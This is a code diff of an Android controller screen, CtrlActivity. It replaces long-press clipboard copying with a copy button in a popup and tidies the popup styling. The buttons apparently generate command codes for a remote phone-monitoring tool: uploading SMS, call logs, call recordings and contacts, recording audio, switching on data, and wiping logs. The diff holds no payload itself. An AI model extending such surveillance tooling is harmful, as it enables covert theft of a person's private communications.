@@ -45,7 +45,7 @@ import android.widget.Toast;
  * @Date:2013-5-31
  */
 @SuppressLint("NewApi")
-public class CtrlActivity extends Activity implements OnClickListener, OnLongClickListener {
+public class CtrlActivity extends Activity implements OnClickListener {
 
 	private ViewPager viewPager;
 	private View viewNormal;
@@ -105,25 +105,12 @@ public class CtrlActivity extends Activity implements OnClickListener, OnLongCli
 		btnRecorderTime.setOnClickListener(this);
 		btnRecorderStart.setOnClickListener(this);
 		btnRecorderStop.setOnClickListener(this);
-
-		// long
-		btnTurnUp.setOnLongClickListener(this);
-		btnTurnDown.setOnLongClickListener(this);
-		btnCallMe.setOnLongClickListener(this);
-
 		// Clear
 		btnClearSms.setOnClickListener(this);
 		btnClearCall.setOnClickListener(this);
 		btnClearCallAudios.setOnClickListener(this);
 		btnClearOtherAudios.setOnClickListener(this);
 		btnClearAll.setOnClickListener(this);
-		// long
-		btnClearSms.setOnLongClickListener(this);
-		btnClearCall.setOnLongClickListener(this);
-		btnClearCallAudios.setOnLongClickListener(this);
-		btnClearOtherAudios.setOnLongClickListener(this);
-		btnClearAll.setOnLongClickListener(this);
-
 		// Upload-wifi
 		btnUploadAll_Wifi.setOnClickListener(this);
 		btnUploadSmsCallLog_Wifi.setOnClickListener(this);
@@ -131,13 +118,6 @@ public class CtrlActivity extends Activity implements OnClickListener, OnLongCli
 		btnUploadOtherAudios_Wifi.setOnClickListener(this);
 		btnUploadContacts_Wifi.setOnClickListener(this);
 		btnWifiOpen.setOnClickListener(this);
-		// long
-		btnUploadAll_Wifi.setOnLongClickListener(this);
-		btnUploadSmsCallLog_Wifi.setOnLongClickListener(this);
-		btnUploadCallAudios_Wifi.setOnLongClickListener(this);
-		btnUploadOtherAudios_Wifi.setOnLongClickListener(this);
-		btnUploadContacts_Wifi.setOnLongClickListener(this);
-		btnWifiOpen.setOnLongClickListener(this);
 		// Upload-mobile
 		btnUploadAll_Mobile.setOnClickListener(this);
 		btnUploadSmsCallLog_Mobile.setOnClickListener(this);
@@ -145,14 +125,6 @@ public class CtrlActivity extends Activity implements OnClickListener, OnLongCli
 		btnUploadOtherAudios_Mobile.setOnClickListener(this);
 		btnUploadContacts_Mobile.setOnClickListener(this);
 		btnMobileOpen.setOnClickListener(this);
-		// long
-		btnUploadAll_Mobile.setOnLongClickListener(this);
-		btnUploadSmsCallLog_Mobile.setOnLongClickListener(this);
-		btnUploadCallAudios_Mobile.setOnLongClickListener(this);
-		btnUploadOtherAudios_Mobile.setOnLongClickListener(this);
-		btnUploadContacts_Mobile.setOnLongClickListener(this);
-		btnMobileOpen.setOnLongClickListener(this);
-
 		textPage.setOnClickListener(new View.OnClickListener() {
 
 			@Override
@@ -318,86 +290,6 @@ public class CtrlActivity extends Activity implements OnClickListener, OnLongCli
 	}
 
 	@Override
-	public boolean onLongClick(View v) {
-		// ClipboardManager clipboarManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-		// clipboarManager.setText("哈哈哈");
-		switch (v.getId()) {
-		case R.id.btn_turn_up:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_UP);
-			break;
-		case R.id.btn_turn_down:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_DOWN);
-			break;
-		case R.id.btn_call_me:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_CALL_ME);
-			break;
-		case R.id.btn_record_time:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_RECORD_TIME);
-			break;
-		case R.id.btn_record_start:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_RECORD_START);
-			break;
-		case R.id.btn_record_end:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_RECORD_END);
-			break;
-		case R.id.btn_del_msg_log:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_MSG_LOG);
-			break;
-		case R.id.btn_del_call_log:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_CALL_LOG);
-			break;
-		case R.id.btn_del_call_audios:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_AUDIOS_CALL);
-			break;
-		case R.id.btn_del_other_audios:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_AUDIOS_OTHER);
-			break;
-		case R.id.btn_del_all:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_ALL_LOG);
-			break;
-		case R.id.btn_upload_all_wifi:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_ALL);
-			break;
-		case R.id.btn_upload_msg_call_log_wifi:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_SMS_CALL);
-			break;
-		case R.id.btn_upload_call_audio_wifi:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_CALL);
-			break;
-		case R.id.btn_upload_other_audio_wifi:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_DELETE_AUDIOS_OTHER);
-			break;
-		case R.id.btn_upload_contacts_wifi:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_CONTACTS);
-			break;
-		case R.id.btn_upload_contacts_mobile:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_CONTACTS_MOBILE);
-			break;
-		case R.id.btn_upload_wifi_open:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_TURNON_WIFI);
-			break;
-		case R.id.btn_upload_mobile_open:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_TURNON_MOBILE);
-			break;
-		case R.id.btn_upload_all_mobile:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_ALL_MOBILE);
-			break;
-		case R.id.btn_upload_msg_call_log_mobile:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE);
-			break;
-		case R.id.btn_upload_call_audio_mobile:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE);
-			break;
-		case R.id.btn_upload_other_audio_mobile:
-			setClipboard(GlobleCs.FIRST + GlobleCs.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE);
-			break;
-		default:
-			break;
-		}
-		return true;
-	}
-
-	@Override
 	public void onClick(View v) {
 		switch (v.getId()) {
 		case R.id.btn_turn_up:
@@ -503,10 +395,10 @@ public class CtrlActivity extends Activity implements OnClickListener, OnLongCli
 			layout = inflater.inflate(R.layout.layout_pop_normal, null);
 
 			Button btnOk = (Button) layout.findViewById(R.id.btn_pop_normal_ok);
-			// Button btnCancel = (Button) layout.findViewById(R.id.btn_pop_normal_cancel);
+			Button btnCopy = (Button) layout.findViewById(R.id.btn_pop_normal_copy);
 			layoutPop = (RelativeLayout) layout.findViewById(R.id.layout_pop_normal_main);
 
-			TextView textCode = (TextView) layout.findViewById(R.id.text_pop_normal_code_show);
+			final TextView textCode = (TextView) layout.findViewById(R.id.text_pop_normal_code_show);
 			textCode.setText(content);
 			btnOk.setOnClickListener(new View.OnClickListener() {
 
@@ -519,22 +411,30 @@ public class CtrlActivity extends Activity implements OnClickListener, OnLongCli
 						public void run() {
 							mainPopWindow.dismiss();
 						}
-					}, 500);
+					}, 350);
 				}
 			});
-			// btnCancel.setOnClickListener(new View.OnClickListener() {
-			//
-			// @Override
-			// public void onClick(View v) {
-			// mainPopWindow.dismiss();
-			// }
-			// });
+			btnCopy.setOnClickListener(new View.OnClickListener() {
+
+				@Override
+				public void onClick(View v) {
+					setClipboard(textCode.getText().toString());
+					new Handler().postDelayed(new Runnable() {
+
+						@Override
+						public void run() {
+							mainPopWindow.dismiss();
+						}
+					}, 350);
+				}
+			});
 
 		} else {
 			layout = inflater.inflate(R.layout.layout_pop_input, null);
 
 			Button btnNext = (Button) layout.findViewById(R.id.btn_pop_input_ok);
-			// Button btnCancel = (Button) layout.findViewById(R.id.btn_pop_input_cancel);
+			// Button btnCancel = (Button)
+			// layout.findViewById(R.id.btn_pop_input_cancel);
 			final EditText editInput = (EditText) layout.findViewById(R.id.edit_pop_input);
 			layoutPop = (RelativeLayout) layout.findViewById(R.id.layout_pop_input_main);
 			btnNext.setOnClickListener(new View.OnClickListener() {
@@ -562,14 +462,6 @@ public class CtrlActivity extends Activity implements OnClickListener, OnLongCli
 					}
 				}
 			});
-			// btnCancel.setOnClickListener(new View.OnClickListener() {
-			//
-			// @Override
-			// public void onClick(View v) {
-			// mainPopWindow.dismiss();
-			// }
-			// });
-
 		}
 
 		layoutPop.setOnClickListener(new View.OnClickListener() {
@@ -579,27 +471,7 @@ public class CtrlActivity extends Activity implements OnClickListener, OnLongCli
 				mainPopWindow.dismiss();
 			}
 		});
-		switch (pageid) {
-
-		case 0:
-			// layoutPop.setBackgroundColor(0xFFCAFF70);
-			layoutPop.setBackgroundColor(0x99000000);
-			break;
-		case 1:
-			// layoutPop.setBackgroundColor(0xFF7EC0EE);
-			layoutPop.setBackgroundColor(0x99000000);
-			break;
-		case 2:
-			// layoutPop.setBackgroundColor(0xFFEEDC82);
-			layoutPop.setBackgroundColor(0x99000000);
-			break;
-		case 3:
-			layoutPop.setBackgroundColor(0x99000000);
-			// layoutPop.setBackgroundColor(0xFFFFC0CB);
-			break;
-		default:
-			break;
-		}
+		layoutPop.setBackgroundColor(0xAA000000);
 		mainPopWindow = new PopupWindow(layout, dMetrics.widthPixels, (int) (dMetrics.heightPixels * 0.5), true);
 		mainPopWindow.setBackgroundDrawable(new ColorDrawable(Color.argb(5, 255, 255, 255)));
 		mainPopWindow.setOutsideTouchable(true);
